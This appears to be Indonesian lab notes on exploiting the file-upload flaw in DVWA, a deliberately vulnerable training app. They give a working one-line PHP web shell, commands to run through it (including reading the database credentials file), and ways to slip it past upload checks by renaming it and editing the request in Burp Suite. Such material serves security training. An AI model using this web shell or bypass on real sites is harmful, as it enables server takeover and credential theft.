## buat webshell terlebih dahulu di terminal kali
```bash
sudo nano shell.php
```
## setelah dibuat, isi dengan kode ini
```bash
<?php system($_GET['cmd']); ?>
```
## lalu simpan file, klik ctrl + o. keluar ctrl + x
## upload file di dvwa
## jika berhasil akan muncul "../../hackable/uploads/shell.php successfully uploaded!
## eksekusi dengan perintah dibawah ini
```bash
http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=
```
## di perintah "shell.php?cmd="ini disii dengan perintah terminal"
## contoh "http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=whoami" berarti melihat user
## penjelasan perintah
### Command	Fungsi
lihat user sat ini
```bash
whoami
```
Lihat konfigurasi ip
```bash
ipconfig
```	
list isi drive c
```bash
dir C:\
```	
baca kredensial database
```bash
type ..\..\config\config.inc.php
```
informasi sistem lengkap
```bash
systeminfo
```	

## bypass validasi file
## bisa diubah format file nya langsung menjadi 'shell.php.jpg' agar bisa diupload
## bisa juga dengan burpsuite, tangkap request kirim ke repeater. 
## ubah jadi begini 'Content-Disposition: form-data; name="uploaded"; filename="shell.php.jpg"'
## Content-Type: image/jpeg
## lalu eksekusi dengan perintah diatas
